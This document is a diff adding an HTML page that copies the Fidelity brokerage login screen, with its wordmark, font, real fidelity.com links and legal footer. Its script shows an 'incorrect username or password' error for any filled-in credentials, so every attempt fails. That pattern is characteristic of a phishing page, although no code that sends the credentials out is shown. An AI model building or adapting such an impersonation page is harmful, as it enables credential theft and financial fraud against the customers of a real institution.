@@ -1,0 +1,374 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Fidelity Login</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet"/>
+  <link rel="stylesheet" href="style.css"/>
+
+  <style>
+    * {
+  box-sizing: border-box;
+  margin: 0;
+  padding: 0;
+  font-family: 'Fidelity Sans', sans-serif;
+}
+
+   @font-face {
+        font-family: "Fidelity Sans";
+        src: url("FidelitySans-Light.woff") format("woff");
+        font-weight: 300; /* Adjust this to match the actual font file */
+        font-style: normal;
+        font-display: swap;
+      }
+
+      
+
+      body {
+        font-family: "Fidelity Sans", Helvetica, sans-serif;
+      }
+
+body {
+  background: #f3f3f3;
+  color: #000;
+}
+
+.topbar {
+    background-color: #fff;
+    border-bottom: 1px solid #ccc;
+    box-sizing: border-box;
+    display: flex;
+    flex-direction: row;
+    flex-wrap: nowrap;
+    font-family: Fidelity Sans, Arial, sans-serif;
+    height: 3.75rem;
+    justify-content: space-between;
+}
+
+.logo img {
+  height: 28px;
+}
+
+.nav-links a {
+  margin-left: 20px;
+  text-decoration: none;
+  color: #000;
+  /* font-weight: 500; */
+}
+
+.login-section {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  padding: 126px 20px;
+}
+
+.login-box {
+  background: white;
+  border-radius: 8px;
+  padding: 32px;
+  width: 100%;
+  max-width: 450px;
+  height:431px;
+  box-shadow: 0 0 0 1px #ddd;
+}
+
+.login-box h2 {
+  margin-bottom: 20px;
+  font-size: 1.5rem;
+}
+
+.login-box label {
+  font-weight: 600;
+  margin-top: 12px;
+  display: block;
+  font-size: 0.95rem;
+}
+
+.login-box input[type="text"],
+.login-box input[type="password"] {
+  width: 100%;
+  padding: 10px;
+  border-radius: 6px;
+  border: 1px solid #aaa;
+  margin-top: 6px;
+}
+
+.password-field {
+  position: relative;
+}
+
+.eye-icon {
+  position: absolute;
+  right: 12px;
+  top: 50%;
+  transform: translateY(-50%);
+  cursor: pointer;
+}
+
+.checkbox-row {
+  display: flex;
+  align-items: center;
+  margin-top: 12px;
+  font-size: 0.95rem;
+}
+
+.checkbox-row input {
+  margin-right: 8px;
+}
+
+.login-btn {
+  margin-top: 20px;
+  width: 100%;
+  background: #368727;
+  color: white;
+  padding: 12px;
+  font-weight: bold;
+  border: none;
+  border-radius: 13px;
+  cursor: pointer;
+  font-size:1rem;
+}
+
+.login-btn:hover {
+  background: #256428;
+}
+
+.forgot {
+  margin-top: 16px;
+  font-size: 0.9rem;
+}
+
+.forgot a {
+  color: #000;
+  text-decoration: underline;
+  font-weight: bold;
+}
+
+.bottom-text {
+  margin-top: 20px;
+  font-size: 0.95rem;
+  text-align: center;
+}
+
+.bottom-text a {
+  color: #000;
+  text-decoration: underline;
+}
+
+  </style>
+</head>
+<body>
+  <header class="topbar">
+    <div class="logo" style="margin: 1rem 0 0 1.25rem;">
+      <img src="Fidelity-wordmark.svg" alt="Fidelity" />
+    </div>
+    <nav class="nav-links" style="margin: 1.3rem 1rem 0 1.25rem;">
+      <a href="https://www.fidelity.com/security/overview">Security</a>
+      <a href="https://www.fidelity.com/customer-service/need-help-logging-in">FAQs</a>
+    </nav>
+  </header>
+
+  <style>
+    .error-box {
+  display: flex;
+  border: 2px solid #dc1616;
+  background-color: #fbeaea;
+  padding: 12px;
+  border-radius: 8px;
+  margin-bottom: 16px;
+  align-items: flex-start;
+  gap: 12px;
+  color: #1a1a1a;
+}
+
+.error-icon {
+  background-color: #dc1616;
+  color: white;
+  border-radius: 50%;
+  width: 32px;
+  height: 32px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 18px;
+  font-weight: bold;
+  flex-shrink: 0;
+}
+
+.error-text {
+  line-height: 1.5;
+  font-size: 14px;
+}
+
+.custom-error-message {
+  display: flex;
+  border: 2px solid #cc0000;
+  border-radius: 8px;
+  overflow: hidden;
+  font-family: Arial, sans-serif;
+  margin-bottom: 16px;
+  max-width: 100%;
+}
+
+.error-left {
+  background-color: #cc0000;
+  color: white;
+  padding: 12px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  min-width: 48px;
+}
+
+.error-icon {
+  font-size: 20px;
+  font-weight: bold;
+  border: 2px solid white;
+  border-radius: 50%;
+  width: 24px;
+  height: 24px;
+  line-height: 20px;
+  text-align: center;
+}
+
+.error-right {
+  padding: 12px;
+  color: #1a1a1a;
+  font-size: 15px;
+  line-height: 1.5;
+  font-weight:500;
+}
+
+
+  </style>
+
+
+
+  <main class="login-section">
+    <div class="login-box" id="login-box">
+      <h2>Log in</h2>
+
+
+<div class="custom-error-message" id="errorBox" style="display: none;">
+  <div class="error-left">
+    <span class="error-icon">!</span>
+  </div>
+  <div class="error-right">
+    <p>You've entered an incorrect username or password. Please try again.</p>
+  </div>
+</div>
+
+
+      <label>Username</label>
+      <input type="text" style="font-size:15px;" placeholder="" />
+
+      <label>Password</label>
+      <div class="password-field">
+        <input type="password" />
+        <span class="eye-icon"></span>
+      </div>
+
+      <div class="checkbox-row">
+        <input type="checkbox" id="remember" style="margin-top:12px;" />
+        <label for="remember">Remember my username</label>
+      </div>
+
+      <button class="login-btn">Log in</button>
+
+      <p class="forgot"><a href="https://digital.fidelity.com/prgw/digital/login/user-identity">Forgot username or password?</a></p>
+    </div>
+
+    <p class="bottom-text">
+      New to Fidelity? <a href="https://www.fidelity.com/open-account/overview">Open an account</a> or <a href="https://digital.fidelity.com/prgw/digital/login/user-identity?intent=nur">sign up</a>.
+    </p>
+  </main>
+
+  <style>
+    .fidelity-footer {
+  background: #f3f3f3;
+  padding: 0px 40px;
+  font-size: .75rem;
+  color: #666;
+  font-weight: 400;
+}
+
+.footer-main p {
+  line-height: 1.6;
+  margin-bottom: 20px;
+}
+
+.footer-main a {
+  color: #666;
+  text-decoration: underline;
+}
+
+.footer-meta {
+  margin-top: 10px;
+  font-size: 13px;
+  color: #666;
+}
+
+.footer-links {
+  display: flex;
+  flex-wrap: wrap;
+  justify-content: flex-end;
+  gap: 18px;
+  font-size: 13px;
+  padding: 10px 11px;
+}
+
+.footer-links a {
+  text-decoration: underline;
+  color: #666;
+}
+
+  </style>
+
+
+<script>
+  const loginBtn = document.querySelector('.login-btn');
+  const errorBox = document.getElementById('errorBox');
+  const height_change = document.getElementById('login-box');
+  const usernameInput = document.querySelector('input[type="text"]');
+  const passwordInput = document.querySelector('input[type="password"]');
+
+  loginBtn.addEventListener('click', () => {
+    if (usernameInput.value.trim() !== '' && passwordInput.value.trim() !== '') {
+      errorBox.style.display = 'flex';
+      usernameInput.style.border = '2px solid #cc0000';
+      passwordInput.style.border = '2px solid #cc0000';
+      height_change.style.height = '470px';
+
+    }
+  });
+</script>
+
+
+
+  <footer class="fidelity-footer">
+  <div class="footer-main">
+    <p>
+      <a href="https://www.fidelity.com/customer-service/nfs-statement-financial-condition">National Financial Services LLC Statement of Financial Condition</a><br/>
+      Use of this site involves the electronic transmission of personal financial information. Using this product is consent to such transmission of this information; such consent is effective at all times when using this site. Fidelity supports 128-bit 
+      <a href="https://www.fidelity.com/security/overview">browser encryption</a>.<br/>
+      Before investing, consider the funds' investment objectives, risks, charges, and expenses. Contact Fidelity for a prospectus or, if available, a summary prospectus containing this information. Read it carefully.<br/>
+      Fidelity Brokerage Services LLC, Member NYSE, SIPC. 900 Salem Street, Smithfield, RI 02917
+    </p>
+    <p class="footer-meta">
+      ©1998-2025 FMR LLC. All Rights Reserved.<br/>
+      1159659.1.0
+    </p>
+  </div>
+  <div class="footer-links">
+    <a href="https://www.fidelity.com/terms-of-use">Terms of use</a>
+    <a href="https://www.fidelity.com/privacy-policy">Privacy</a>
+    <a href="https://www.fidelity.com/security/overview">Security</a>
+    <a href="https://www.fidelity.com/accessibility/overview">Accessibility</a>
+    <a href="https://www.fidelity.com/terms-of-use#For">This is for persons in the US only</a>
+  </div>
+</footer>
+
+</body>
+</html>
